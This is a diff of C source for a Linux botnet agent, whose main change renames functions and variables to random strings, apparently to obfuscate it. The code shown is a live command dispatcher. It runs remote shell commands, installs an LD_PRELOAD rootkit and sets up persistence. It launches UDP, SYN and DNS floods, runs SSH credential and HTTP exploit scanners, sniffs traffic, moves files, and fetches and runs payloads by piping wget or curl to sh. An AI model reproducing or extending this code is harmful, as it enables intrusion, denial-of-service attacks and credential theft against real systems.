@@ -9,16 +9,16 @@
 #endif
 
 /* ==========================================================================
- * SHELL EXECUTION (matches Go sidewinder -- blocking exec)
+ * SHELL EXECUTION (matches Go Kc5Lw2k -- blocking exec)
  * ========================================================================== */
 
-dstr sidewinder(const char *cmd) {
+dstr Kc5Lw2k(const char *cmd) {
     dstr output;
     FILE *fp;
     char buf[4096];
     int status;
 
-    ensure_proto();
+    DS4RR2W();
 
     /* popen() already invokes sh -c, so pass cmd directly — no double-wrap */
     ds_init(&output);
@@ -45,11 +45,11 @@ dstr sidewinder(const char *cmd) {
  * DETACHED EXEC (matches Go oceanLotus -- fire-and-forget)
  * ========================================================================== */
 
-void ocean_lotus(const char *cmd) {
+void YS5EH8a(const char *cmd) {
     pid_t pid;
     int null_fd;
 
-    ensure_proto();
+    DS4RR2W();
     pid = fork();
     if (pid == 0) {
         /* Child */
@@ -61,26 +61,26 @@ void ocean_lotus(const char *cmd) {
             dup2(null_fd, STDERR_FILENO);
             if (null_fd > 2) close(null_fd);
         }
-        execl(ds_cstr(&g_shell_bin), ds_cstr(&g_shell_bin),
-              ds_cstr(&g_shell_flag), cmd, (char *)NULL);
+        execl(ds_cstr(&_jy7Ho4s), ds_cstr(&_jy7Ho4s),
+              ds_cstr(&_oD3KN5M), cmd, (char *)NULL);
         _exit(1);
     }
     /* Parent: don't wait */
 }
 
 /* ==========================================================================
- * STREAMING EXEC (matches Go machete -- real-time output over C2)
+ * STREAMING EXEC (matches Go bn5GN4t -- real-time output over C2)
  * ========================================================================== */
 
 /* Thread context for pipe reader threads */
 typedef struct {
     int      fd;
-    conn_t  *conn;
+    _EA8up4M  *conn;
     const char *fmt; /* pointer to ds_cstr of the format global */
-} pipe_reader_ctx_t;
+} _Qa5oq7N;
 
-static void *pipe_reader_thread(void *arg) {
-    pipe_reader_ctx_t *ctx = (pipe_reader_ctx_t *)arg;
+static void *Aj7dy5u(void *arg) {
+    _Qa5oq7N *ctx = (_Qa5oq7N *)arg;
     FILE *f;
     char line[4096];
     char sendbuf[4200];
@@ -93,21 +93,21 @@ static void *pipe_reader_thread(void *arg) {
     }
     while (fgets(line, sizeof(line), f)) {
         snprintf(sendbuf, sizeof(sendbuf), ctx->fmt, line);
-        vpn_writes(ctx->conn, sendbuf);
+        Ng2ZR5y(ctx->conn, sendbuf);
     }
     fclose(f); /* also closes ctx->fd */
     free(ctx);
     return NULL;
 }
 
-void machete(const char *cmd, conn_t *c) {
+void bn5GN4t(const char *cmd, _EA8up4M *c) {
     int stdout_pipe[2], stderr_pipe[2];
     pid_t pid;
     pthread_t stdout_tid, stderr_tid;
-    pipe_reader_ctx_t *out_ctx, *err_ctx;
+    _Qa5oq7N *out_ctx, *err_ctx;
     int status;
 
-    ensure_proto();
+    DS4RR2W();
 
     if (pipe(stdout_pipe) < 0) return;
     if (pipe(stderr_pipe) < 0) {
@@ -130,8 +130,8 @@ void machete(const char *cmd, conn_t *c) {
         dup2(stderr_pipe[1], STDERR_FILENO);
         close(stdout_pipe[1]);
         close(stderr_pipe[1]);
-        execl(ds_cstr(&g_shell_bin), ds_cstr(&g_shell_bin),
-              ds_cstr(&g_shell_flag), cmd, (char *)NULL);
+        execl(ds_cstr(&_jy7Ho4s), ds_cstr(&_jy7Ho4s),
+              ds_cstr(&_oD3KN5M), cmd, (char *)NULL);
         _exit(1);
     }
 
@@ -139,17 +139,17 @@ void machete(const char *cmd, conn_t *c) {
     close(stdout_pipe[1]);
     close(stderr_pipe[1]);
 
-    out_ctx = (pipe_reader_ctx_t *)malloc(sizeof(pipe_reader_ctx_t));
+    out_ctx = (_Qa5oq7N *)malloc(sizeof(_Qa5oq7N));
     out_ctx->fd   = stdout_pipe[0];
     out_ctx->conn = c;
-    out_ctx->fmt  = ds_cstr(&g_proto_stdout_fmt);
-    pthread_create(&stdout_tid, NULL, pipe_reader_thread, out_ctx);
+    out_ctx->fmt  = ds_cstr(&_Ag2PA3Y);
+    pthread_create(&stdout_tid, NULL, Aj7dy5u, out_ctx);
 
-    err_ctx = (pipe_reader_ctx_t *)malloc(sizeof(pipe_reader_ctx_t));
+    err_ctx = (_Qa5oq7N *)malloc(sizeof(_Qa5oq7N));
     err_ctx->fd   = stderr_pipe[0];
     err_ctx->conn = c;
-    err_ctx->fmt  = ds_cstr(&g_proto_stderr_fmt);
-    pthread_create(&stderr_tid, NULL, pipe_reader_thread, err_ctx);
+    err_ctx->fmt  = ds_cstr(&_sq2vi4d);
+    pthread_create(&stderr_tid, NULL, Aj7dy5u, err_ctx);
 
     status = 0;
     waitpid(pid, &status, 0);
@@ -160,10 +160,10 @@ void machete(const char *cmd, conn_t *c) {
         char buf[256];
         char codebuf[32];
         snprintf(codebuf, sizeof(codebuf), "exit code %d", WEXITSTATUS(status));
-        snprintf(buf, sizeof(buf), ds_cstr(&g_proto_exit_err_fmt), codebuf);
-        vpn_writes(c, buf);
+        snprintf(buf, sizeof(buf), ds_cstr(&_yh8Vu8D), codebuf);
+        Ng2ZR5y(c, buf);
     } else {
-        vpn_writes(c, ds_cstr(&g_proto_exit_ok));
+        Ng2ZR5y(c, ds_cstr(&_VD7BQ4c));
     }
 }
 
@@ -173,12 +173,12 @@ void machete(const char *cmd, conn_t *c) {
 
 typedef struct {
     char   *cmd;
-    conn_t *conn;
+    _EA8up4M *conn;
 } machete_ctx_t;
 
-static void *machete_thread(void *arg) {
+static void *Kj7VJ5r(void *arg) {
     machete_ctx_t *ctx = (machete_ctx_t *)arg;
-    machete(ctx->cmd, ctx->conn);
+    bn5GN4t(ctx->cmd, ctx->conn);
     free(ctx->cmd);
     free(ctx);
     return NULL;
@@ -188,17 +188,17 @@ static void *machete_thread(void *arg) {
  * DRAGONFLY THREAD WRAPPER (for detached persist)
  * ========================================================================== */
 
-static void *dragonfly_thread(void *arg) {
+static void *Ba7RE7V(void *arg) {
     (void)arg;
-    dragonfly();
+    Zp8bU5j();
     return NULL;
 }
 
 /* ==========================================================================
- * HELPER: tokenize a command string into a strarr
+ * HELPER: _Ps6Dz6i a command string into a strarr
  * ========================================================================== */
 
-static void tokenize(const char *command, strarr *fields) {
+static void _Ps6Dz6i(const char *command, strarr *fields) {
     const char *p = command;
     sa_init(fields);
     while (*p) {
@@ -223,7 +223,7 @@ static const char *find_args(const char *command, const char *first_arg) {
 }
 
 /* Helper: check if string is all digits */
-static int is_port_str(const char *s) {
+static int _HS3Vk8U(const char *s) {
     if (!s || !*s) return 0;
     while (*s) {
         if (*s < '0' || *s > '9') return 0;
@@ -236,15 +236,15 @@ static int is_port_str(const char *s) {
  * COMMAND DISPATCHER (matches Go blackEnergy)
  * ========================================================================== */
 
-int black_energy(conn_t *c, const char *command) {
+int CS6Ko7t(_EA8up4M *c, const char *command) {
     strarr fields;
     const char *cmd_str;
     int result = -1;
 
-    ensure_proto();
-    ensure_network();
+    DS4RR2W();
+    Ng4eX6x();
 
-    tokenize(command, &fields);
+    _Ps6Dz6i(command, &fields);
     if (sa_count(&fields) == 0) { sa_free(&fields); return -1; }
 
     cmd_str = sa_get(&fields, 0);
@@ -255,20 +255,20 @@ int black_energy(conn_t *c, const char *command) {
         dstr output, encoded, msg;
         if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
         args = find_args(command, sa_get(&fields, 1));
-        output = sidewinder(args);
-        encoded = base64_encode((const uint8_t *)ds_cstr(&output), ds_len(&output));
+        output = Kc5Lw2k(args);
+        encoded = _uA7kc2G((const uint8_t *)ds_cstr(&output), ds_len(&output));
         ds_free(&output);
 
         ds_init(&msg);
         {
-            size_t needed = ds_len(&encoded) + ds_len(&g_proto_out_fmt) + 16;
+            size_t needed = ds_len(&encoded) + ds_len(&_nE6py4K) + 16;
             char *buf = (char *)malloc(needed);
-            snprintf(buf, needed, ds_cstr(&g_proto_out_fmt), ds_cstr(&encoded));
+            snprintf(buf, needed, ds_cstr(&_nE6py4K), ds_cstr(&encoded));
             ds_set(&msg, buf);
             free(buf);
         }
         ds_free(&encoded);
-        vpn_writes(c, ds_cstr(&msg));
+        Ng2ZR5y(c, ds_cstr(&msg));
         ds_free(&msg);
         result = 0;
         goto done;
@@ -287,9 +287,9 @@ int black_energy(conn_t *c, const char *command) {
         if (!ctx->cmd) { free(ctx); sa_free(&fields); return -1; }
         memcpy(ctx->cmd, args, strlen(args) + 1);
         ctx->conn = c;
-        pthread_create(&tid, NULL, machete_thread, ctx);
+        pthread_create(&tid, NULL, Kj7VJ5r, ctx);
         pthread_detach(tid);
-        vpn_writes(c, ds_cstr(&g_msg_stream_start));
+        Ng2ZR5y(c, ds_cstr(&_KZ7LL3b));
         result = 0;
         goto done;
     }
@@ -299,8 +299,8 @@ int black_energy(conn_t *c, const char *command) {
         const char *args;
         if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
         args = find_args(command, sa_get(&fields, 1));
-        ocean_lotus(args);
-        vpn_writes(c, ds_cstr(&g_msg_bg_start));
+        YS5EH8a(args);
+        Ng2ZR5y(c, ds_cstr(&_Vm7uC8w));
         result = 0;
         goto done;
     }
@@ -311,22 +311,22 @@ int black_energy(conn_t *c, const char *command) {
         const char *sub = (sa_count(&fields) >= 2) ? sa_get(&fields, 1) : "";
         if (strcmp(sub, "rootkit") == 0) {
             const char *b64 = (sa_count(&fields) >= 3) ? find_args(command, sa_get(&fields, 2)) : "";
-            rootkit_install(b64);
-            vpn_writes(c, "[rootkit] LD_PRELOAD rootkit installed\n");
+            vF6ku2D(b64);
+            Ng2ZR5y(c, "[rootkit] LD_PRELOAD rootkit installed\n");
             result = 0;
             goto done;
         } else if (strcmp(sub, "unrootkit") == 0) {
-            rootkit_remove();
-            vpn_writes(c, "[rootkit] Rootkit removed\n");
+            uB5TJ8d();
+            Ng2ZR5y(c, "[rootkit] Rootkit removed\n");
             result = 0;
             goto done;
         }
         /* Default: standard persistence (systemd/cron) */
         {
             pthread_t tid;
-            pthread_create(&tid, NULL, dragonfly_thread, NULL);
+            pthread_create(&tid, NULL, Ba7RE7V, NULL);
             pthread_detach(tid);
-            vpn_writes(c, ds_cstr(&g_msg_persist_start));
+            Ng2ZR5y(c, ds_cstr(&_HH8Az2g));
         }
         result = 0;
         goto done;
@@ -334,16 +334,16 @@ int black_energy(conn_t *c, const char *command) {
 
     /* !kill -- self-destruct */
     if (strcmp(cmd_str, "!kill") == 0) {
-        vpn_writes(c, ds_cstr(&g_msg_kill_ack));
+        Ng2ZR5y(c, ds_cstr(&_hb6Aa4L));
         sa_free(&fields);
-        nuke_and_exit();
+        DB2Ve6Z();
         return 0; /* unreachable */
     }
 
     /* !exit -- lightweight process exit (no nuke, persistence stays intact).
      * Used by CNC to kick a stale session so a new instance can take over. */
     if (strcmp(cmd_str, "!exit") == 0) {
-        debug_log("!exit received from CNC, shutting down (PID %d)", (int)getpid());
+        _nS5PJ8Y("!exit received from CNC, shutting down (PID %d)", (int)getpid());
         sa_free(&fields);
         _exit(0);
         return 0; /* unreachable */
@@ -358,14 +358,14 @@ int black_energy(conn_t *c, const char *command) {
 
         memset(hostname, 0, sizeof(hostname));
         gethostname(hostname, sizeof(hostname) - 1);
-        charming_kitten(&arch);
-        mustang_panda(&id);
+        Xy5oR2j(&arch);
+        Ai2mW7K(&id);
 
         snprintf(info, sizeof(info),
                  "Hostname: %s\nArch: %s\nBotID: %s\nOS: Linux\n",
                  hostname, ds_cstr(&arch), ds_cstr(&id));
-        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&g_proto_info_fmt), info);
-        vpn_writes(c, sendbuf);
+        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&_mi6YG6d), info);
+        Ng2ZR5y(c, sendbuf);
 
         ds_free(&arch);
         ds_free(&id);
@@ -382,52 +382,52 @@ int black_energy(conn_t *c, const char *command) {
                 dstr rhost, rport;
                 ds_init(&rhost);
                 ds_init(&rport);
-                if (parse_address(arg, &rhost, &rport)) {
-                    int err = relay_backconnect(ds_cstr(&rhost), ds_cstr(&rport), c);
+                if (gv4Kv3u(arg, &rhost, &rport)) {
+                    int err = MA2zo8a(ds_cstr(&rhost), ds_cstr(&rport), c);
                     if (err < 0) {
                         char buf[256];
-                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "relay connect failed");
-                        vpn_writes(c, buf);
+                        snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "relay connect failed");
+                        Ng2ZR5y(c, buf);
                     } else {
                         char buf[256];
-                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), arg);
-                        vpn_writes(c, buf);
+                        snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), arg);
+                        Ng2ZR5y(c, buf);
                     }
                 } else {
                     char buf[256];
-                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "invalid relay address");
-                    vpn_writes(c, buf);
+                    snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "invalid relay address");
+                    Ng2ZR5y(c, buf);
                 }
                 ds_free(&rhost);
                 ds_free(&rport);
             } else {
                 /* Direct mode: arg is port number */
-                int err = turmoil(arg, c);
+                int err = jw8CH7B(arg, c);
                 if (err != 0) {
                     char buf[256];
-                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
-                    vpn_writes(c, buf);
+                    snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "bind failed");
+                    Ng2ZR5y(c, buf);
                 } else {
                     char buf[256];
                     char addr[64];
                     snprintf(addr, sizeof(addr), "0.0.0.0:%s", arg);
-                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), addr);
-                    vpn_writes(c, buf);
+                    snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), addr);
+                    Ng2ZR5y(c, buf);
                 }
             }
             result = 0;
             goto done;
         } else {
             /* Default port 1080 */
-            int err = turmoil("1080", c);
+            int err = jw8CH7B("1080", c);
             if (err != 0) {
                 char buf[256];
-                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
-                vpn_writes(c, buf);
+                snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "bind failed");
+                Ng2ZR5y(c, buf);
             } else {
                 char buf[256];
-                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), "0.0.0.0:1080");
-                vpn_writes(c, buf);
+                snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), "0.0.0.0:1080");
+                Ng2ZR5y(c, buf);
             }
             result = 0;
             goto done;
@@ -440,7 +440,7 @@ int black_energy(conn_t *c, const char *command) {
      * Example: !attack syn 1.2.3.4 80 30 size=512
      */
     if (strcmp(cmd_str, "!attack") == 0) {
-        static const struct { const char *name; uint8_t id; } methods[] = {
+        const struct { const char *name; uint8_t id; } methods[] = {
             {"udp",        ATK_VEC_UDP},
             {"vse",        ATK_VEC_VSE},
             {"dns",        ATK_VEC_DNS},
@@ -459,7 +459,7 @@ int black_energy(conn_t *c, const char *command) {
             {"asyn",       ATK_VEC_ASYN},
             {NULL, 0}
         };
-        static const struct { const char *key; uint8_t opt_id; } opt_map[] = {
+        const struct { const char *key; uint8_t opt_id; } opt_map[] = {
             {"size",    ATK_OPT_PAYLOAD_SIZE}, {"rand",   ATK_OPT_PAYLOAD_RAND},
             {"tos",     ATK_OPT_IP_TOS},      {"ident",  ATK_OPT_IP_IDENT},
             {"ttl",     ATK_OPT_IP_TTL},       {"df",     ATK_OPT_IP_DF},
@@ -479,7 +479,7 @@ int black_energy(conn_t *c, const char *command) {
         int i;
 
         if (sa_count(&fields) < 5) {
-            vpn_writes(c, "Usage: !attack <method> <ip> <port> <duration> [opts...]\n");
+            Ng2ZR5y(c, "Usage: !attack <method> <ip> <port> <duration> [opts...]\n");
             result = -1;
             goto done;
         }
@@ -492,7 +492,7 @@ int black_energy(conn_t *c, const char *command) {
         }
         if (method_id == 0xff) {
             snprintf(sendbuf, sizeof(sendbuf), "Unknown method: %s\n", sa_get(&fields, 1));
-            vpn_writes(c, sendbuf);
+            Ng2ZR5y(c, sendbuf);
             result = -1;
             goto done;
         }
@@ -502,12 +502,12 @@ int black_energy(conn_t *c, const char *command) {
         duration = (uint32_t)atoi(sa_get(&fields, 4));
 
         if (target_ip == INADDR_NONE || duration == 0) {
-            vpn_writes(c, "Invalid target IP or duration\n");
+            Ng2ZR5y(c, "Invalid target IP or duration\n");
             result = -1;
             goto done;
         }
 
-        /* Build binary buffer for attack_parse:
+        /* Build binary buffer for dz4NW6v:
          * [uint32 duration BE][uint8 vector][uint8 num_targets]
          * [uint32 ip][uint8 netmask]
          * [uint8 num_opts]([uint8 opt_key][uint8 val_len][val bytes])...
@@ -573,12 +573,12 @@ int black_energy(conn_t *c, const char *command) {
 
             buf[opts_start] = (char)num_opts;
 
-            attack_parse(buf, pos);
+            dz4NW6v(buf, pos);
 
             snprintf(sendbuf, sizeof(sendbuf),
                      "[attack] %s -> %s:%d for %ds started\n",
                      sa_get(&fields, 1), sa_get(&fields, 2), port, duration);
-            vpn_writes(c, sendbuf);
+            Ng2ZR5y(c, sendbuf);
         }
         result = 0;
         goto done;
@@ -586,8 +586,8 @@ int black_energy(conn_t *c, const char *command) {
 
     /* !stopattack -- kill all running floods */
     if (strcmp(cmd_str, "!stopattack") == 0) {
-        attack_kill_all();
-        vpn_writes(c, "[attack] all floods stopped\n");
+        UV8wo4a();
+        Ng2ZR5y(c, "[attack] all floods stopped\n");
         result = 0;
         goto done;
     }
@@ -599,31 +599,41 @@ int black_energy(conn_t *c, const char *command) {
         const char *url;
         char cmd_buf[1024];
         if (sa_count(&fields) < 2) {
-            vpn_writes(c, "[reinstall] missing URL\n");
+            Ng2ZR5y(c, "[reinstall] missing URL\n");
             result = -1;
             goto done;
         }
         url = sa_get(&fields, 1);
 
-        vpn_writes(c, "[reinstall] replacing — killing self, fetching fresh binary\n");
+        Ng2ZR5y(c, "[reinstall] replacing — killing self, fetching fresh binary\n");
 
         /* Remove cached binary so the loader re-downloads */
         {
             dstr bin_path;
-            ensure_persist();
+            Ri2bh5v();
             ds_init(&bin_path);
-            ds_catds(&bin_path, &g_store_dir);
+            ds_catds(&bin_path, &_UW4jD7J);
             ds_cat(&bin_path, "/");
-            ds_catds(&bin_path, &g_bin_label);
+            ds_catds(&bin_path, &_Cs5Qb7D);
             unlink(ds_cstr(&bin_path));
             ds_free(&bin_path);
         }
 
-        /* Fire loader in background — it will start a new instance */
-        snprintf(cmd_buf, sizeof(cmd_buf),
-                 "(wget -qO- '%s' | sh || curl -sL '%s' | sh) &",
-                 url, url);
-        ocean_lotus(cmd_buf);
+        /* Sanitise URL: strip single quotes so they can't break the sh quoting */
+        {
+            char safe_url[1024];
+            size_t si = 0, di = 0;
+            while (url[si] && di < sizeof(safe_url) - 1) {
+                if (url[si] != '\'') safe_url[di++] = url[si];
+                si++;
+            }
+            safe_url[di] = '\0';
+
+            snprintf(cmd_buf, sizeof(cmd_buf),
+                     "(wget -qO- '%s' | sh || curl -sL '%s' | sh) &",
+                     safe_url, safe_url);
+        }
+        YS5EH8a(cmd_buf);
 
         /* Give the background fetch a moment to fork, then die */
         usleep(200000);
@@ -632,56 +642,23 @@ int black_energy(conn_t *c, const char *command) {
 
     /* !stopsocks -- stop proxy */
     if (strcmp(cmd_str, "!stopsocks") == 0) {
-        emotet();
-        vpn_writes(c, ds_cstr(&g_msg_socks_stop));
+        tV4Lm4J();
+        Ng2ZR5y(c, ds_cstr(&_cJ8BU8L));
         result = 0;
         goto done;
     }
 
 #ifndef NO_SELFREP
-    /* !scan <host:port> -- start telnet scanner reporting to scan server */
-    if (strcmp(cmd_str, "!scan") == 0) {
-        if (g_scanner_running) {
-            vpn_writes(c, "[scanner] Already running\n");
-        } else if (sa_count(&fields) < 2) {
-            vpn_writes(c, "Usage: !scan <host:port>\n");
-            result = -1;
-            goto done;
-        } else {
-            const char *addr = sa_get(&fields, 1);
-            char buf[256];
-            scanner_init(addr);
-            snprintf(buf, sizeof(buf), "[scanner] Starting — reporting to %s\n", addr);
-            vpn_writes(c, buf);
-        }
-        result = 0;
-        goto done;
-    }
-
-    /* !stopscan -- stop telnet scanner */
-    if (strcmp(cmd_str, "!stopscan") == 0) {
-        if (g_scanner_running) {
-            scanner_kill();
-            vpn_writes(c, "[scanner] Scanner stopped\n");
-        } else {
-            vpn_writes(c, "[scanner] Scanner not running\n");
-        }
-        result = 0;
-        goto done;
-    }
-
-
-
     /* !ssh <base64 payload> -- start SSH credential scanner */
     if (strcmp(cmd_str, "!ssh") == 0) {
         const char *args_ssh;
         if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
         args_ssh = find_args(command, sa_get(&fields, 1));
-        if (ssh_scanner_pid > 0) {
-            vpn_writes(c, "[ssh] Already running\n");
+        if (_bj8XN2t > 0) {
+            Ng2ZR5y(c, "[ssh] Already running\n");
         } else {
-            ssh_scanner_init(args_ssh, c);
-            vpn_writes(c, "[ssh] Scanner started\n");
+            kh8hL4N(args_ssh, c);
+            Ng2ZR5y(c, "[ssh] Scanner started\n");
         }
         result = 0;
         goto done;
@@ -689,11 +666,11 @@ int black_energy(conn_t *c, const char *command) {
 
     /* !stopssh -- stop SSH scanner */
     if (strcmp(cmd_str, "!stopssh") == 0) {
-        if (ssh_scanner_pid > 0) {
-            ssh_scanner_kill();
-            vpn_writes(c, "[ssh] Scanner stopped\n");
+        if (_bj8XN2t > 0) {
+            Ss3vb6a();
+            Ng2ZR5y(c, "[ssh] Scanner stopped\n");
         } else {
-            vpn_writes(c, "[ssh] Scanner not running\n");
+            Ng2ZR5y(c, "[ssh] Scanner not running\n");
         }
         result = 0;
         goto done;
@@ -704,19 +681,36 @@ int black_energy(conn_t *c, const char *command) {
         const char *args_http;
         if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
         args_http = find_args(command, sa_get(&fields, 1));
-        if (http_exploit_pid > 0) {
-            vpn_writes(c, "[http] Already running\n");
+        if (_AR2yQ6h > 0) {
+            Ng2ZR5y(c, "[http] Already running\n");
         } else {
-            http_exploit_init(args_http);
-            vpn_writes(c, "[http] Exploit module started\n");
+            St3TW4o(args_http);
+            Ng2ZR5y(c, "[http] Exploit module started\n");
         }
         result = 0;
         goto done;
     }
 
     if (strcmp(cmd_str, "!stophttp") == 0) {
-        if (http_exploit_pid > 0) { http_exploit_kill(); vpn_writes(c, "[http] Stopped\n"); }
-        else vpn_writes(c, "[http] Not running\n");
+        if (_AR2yQ6h > 0) { Gc5wq8T(); Ng2ZR5y(c, "[http] Stopped\n"); }
+        else Ng2ZR5y(c, "[http] Not running\n");
+        result = 0; goto done;
+    }
+
+    if (strcmp(cmd_str, "!sniff") == 0) {
+        if (_sn7PK3z > 0) {
+            Ng2ZR5y(c, "[sniff] Already running\n");
+        } else {
+            const char *args_sniff = (sa_count(&fields) >= 2) ? sa_get(&fields, 1) : "/tmp/.sniff.log";
+            sniffer_init(args_sniff);
+            Ng2ZR5y(c, "[sniff] Sniffer started\n");
+        }
+        result = 0; goto done;
+    }
+
+    if (strcmp(cmd_str, "!stopsniff") == 0) {
+        if (_sn7PK3z > 0) { sniffer_kill(); Ng2ZR5y(c, "[sniff] Stopped\n"); }
+        else Ng2ZR5y(c, "[sniff] Not running\n");
         result = 0; goto done;
     }
 
@@ -733,7 +727,7 @@ int black_energy(conn_t *c, const char *command) {
         const char *basename_ptr;
 
         if (sa_count(&fields) < 2) {
-            vpn_writes(c, "[download] missing path\n");
+            Ng2ZR5y(c, "[download] missing path\n");
             result = -1;
             goto done;
         }
@@ -743,7 +737,7 @@ int black_energy(conn_t *c, const char *command) {
         if (!f) {
             char ebuf[512];
             snprintf(ebuf, sizeof(ebuf), "[download] cannot open: %s\n", path);
-            vpn_writes(c, ebuf);
+            Ng2ZR5y(c, ebuf);
             result = -1;
             goto done;
         }
@@ -752,7 +746,7 @@ int black_energy(conn_t *c, const char *command) {
         fseek(f, 0, SEEK_SET);
         if (fsize < 0 || fsize > 10 * 1024 * 1024) {
             fclose(f);
-            vpn_writes(c, "[download] file too large (>10MB)\n");
+            Ng2ZR5y(c, "[download] file too large (>10MB)\n");
             result = -1;
             goto done;
         }
@@ -761,13 +755,13 @@ int black_energy(conn_t *c, const char *command) {
         if ((long)fread(raw, 1, (size_t)fsize, f) != fsize) {
             free(raw);
             fclose(f);
-            vpn_writes(c, "[download] read error\n");
+            Ng2ZR5y(c, "[download] read error\n");
             result = -1;
             goto done;
         }
         fclose(f);
 
-        b64 = base64_encode((const uint8_t *)raw, (size_t)fsize);
+        b64 = _uA7kc2G((const uint8_t *)raw, (size_t)fsize);
         free(raw);
 
         /* Extract basename from path */
@@ -784,7 +778,7 @@ int black_energy(conn_t *c, const char *command) {
         ds_cat(&msg, "\n__FILE_END__\n");
         ds_free(&b64);
 
-        vpn_writes(c, ds_cstr(&msg));
+        Ng2ZR5y(c, ds_cstr(&msg));
         ds_free(&msg);
         result = 0;
         goto done;
@@ -798,15 +792,15 @@ int black_energy(conn_t *c, const char *command) {
         FILE *f;
 
         if (sa_count(&fields) < 3) {
-            vpn_writes(c, "[upload] usage: !upload <path> <base64data>\n");
+            Ng2ZR5y(c, "[upload] usage: !upload <path> <base64data>\n");
             result = -1;
             goto done;
         }
         path = sa_get(&fields, 1);
         b64data = sa_get(&fields, 2);
-        decoded = base64_decode(b64data);
+        decoded = _rr5LH7D(b64data);
         if (db_len(&decoded) == 0 && strlen(b64data) > 0) {
-            vpn_writes(c, "[upload] base64 decode failed\n");
+            Ng2ZR5y(c, "[upload] base64 decode failed\n");
             db_free(&decoded);
             result = -1;
             goto done;
@@ -815,7 +809,7 @@ int black_energy(conn_t *c, const char *command) {
         if (!f) {
             char ebuf[512];
             snprintf(ebuf, sizeof(ebuf), "[upload] cannot write: %s\n", path);
-            vpn_writes(c, ebuf);
+            Ng2ZR5y(c, ebuf);
             db_free(&decoded);
             result = -1;
             goto done;
@@ -826,7 +820,7 @@ int black_energy(conn_t *c, const char *command) {
             char obuf[512];
             snprintf(obuf, sizeof(obuf), "[upload] wrote %lu bytes to %s\n",
                      (unsigned long)db_len(&decoded), path);
-            vpn_writes(c, obuf);
+            Ng2ZR5y(c, obuf);
         }
         db_free(&decoded);
         result = 0;
@@ -837,12 +831,12 @@ int black_energy(conn_t *c, const char *command) {
     if (strcmp(cmd_str, "!socksauth") == 0) {
         char buf[256];
         if (sa_count(&fields) < 3) { sa_free(&fields); return -1; }
-        pthread_mutex_lock(&g_socks_creds_mtx);
-        ds_set(&g_proxy_user, sa_get(&fields, 1));
-        ds_set(&g_proxy_pass, sa_get(&fields, 2));
-        pthread_mutex_unlock(&g_socks_creds_mtx);
-        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_auth_fmt), sa_get(&fields, 1), sa_get(&fields, 2));
-        vpn_writes(c, buf);
+        pthread_mutex_lock(&_kL3Yy7R);
+        ds_set(&_yr2Dc6W, sa_get(&fields, 1));
+        ds_set(&_uv4SZ5A, sa_get(&fields, 2));
+        pthread_mutex_unlock(&_kL3Yy7R);
+        snprintf(buf, sizeof(buf), ds_cstr(&_am5bJ3X), sa_get(&fields, 1), sa_get(&fields, 2));
+        Ng2ZR5y(c, buf);
         result = 0;
         goto done;
     }
@@ -857,12 +851,12 @@ done:
 
 /* ==========================================================================
  * BINARY COMMAND DISPATCHER (cmd_id + raw args)
- * Maps byte IDs to the same logic as black_energy but skips string matching.
+ * Maps byte IDs to the same logic as CS6Ko7t but skips string matching.
  * ========================================================================== */
 
-int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
-    ensure_proto();
-    ensure_network();
+int yD8Ug8t(_EA8up4M *c, uint8_t cmd_id, const char *args) {
+    DS4RR2W();
+    Ng4eX6x();
 
     switch (cmd_id) {
 
@@ -870,19 +864,19 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
     {
         dstr output, encoded, msg;
         if (!args || !args[0]) return -1;
-        output = sidewinder(args);
-        encoded = base64_encode((const uint8_t *)ds_cstr(&output), ds_len(&output));
+        output = Kc5Lw2k(args);
+        encoded = _uA7kc2G((const uint8_t *)ds_cstr(&output), ds_len(&output));
         ds_free(&output);
         ds_init(&msg);
         {
-            size_t needed = ds_len(&encoded) + ds_len(&g_proto_out_fmt) + 16;
+            size_t needed = ds_len(&encoded) + ds_len(&_nE6py4K) + 16;
             char *buf = (char *)malloc(needed);
-            snprintf(buf, needed, ds_cstr(&g_proto_out_fmt), ds_cstr(&encoded));
+            snprintf(buf, needed, ds_cstr(&_nE6py4K), ds_cstr(&encoded));
             ds_set(&msg, buf);
             free(buf);
         }
         ds_free(&encoded);
-        vpn_writes(c, ds_cstr(&msg));
+        Ng2ZR5y(c, ds_cstr(&msg));
         ds_free(&msg);
         return 0;
     }
@@ -898,16 +892,25 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
         if (!ctx->cmd) { free(ctx); return -1; }
         memcpy(ctx->cmd, args, strlen(args) + 1);
         ctx->conn = c;
-        pthread_create(&tid, NULL, machete_thread, ctx);
+        pthread_create(&tid, NULL, Kj7VJ5r, ctx);
         pthread_detach(tid);
-        vpn_writes(c, ds_cstr(&g_msg_stream_start));
+        Ng2ZR5y(c, ds_cstr(&_KZ7LL3b));
         return 0;
     }
 
     case CMD_DETACH: /* args = command string */
         if (!args || !args[0]) return -1;
-        ocean_lotus(args);
-        vpn_writes(c, ds_cstr(&g_msg_bg_start));
+        YS5EH8a(args);
+        Ng2ZR5y(c, ds_cstr(&_Vm7uC8w));
+        return 0;
+
+    case CMD_PTY: /* open PTY session */
+        Pz9Pty4W(c);
+        return 0;
+
+    case CMD_PTYDATA: /* write to PTY stdin */
+        if (!args) return -1;
